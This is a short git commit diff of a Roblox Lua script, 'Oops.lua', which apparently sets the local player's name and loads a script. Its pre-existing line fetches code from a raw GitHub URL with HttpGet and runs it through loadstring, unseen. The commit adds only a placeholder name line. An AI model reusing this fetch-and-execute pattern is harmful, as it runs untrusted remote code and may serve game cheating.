a7f017a25bdf4e69724eab64396d4ea967df5d53
ThatsMyMute <75107278+ThatsMyMute@users.noreply.github.com>
2024-12-17 10:31:06 -0500

    Update Oops.lua

--- Oops.lua
+++ Oops.lua
@@ -1,2 +1,4 @@
 game.Players.LocalPlayer.Name = "DoYouWant_Lucki"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dracodx9/fulll/refs/heads/main/spider"))()
+
+game.Players.LocalPlayer.Name = "URNAME HERE"
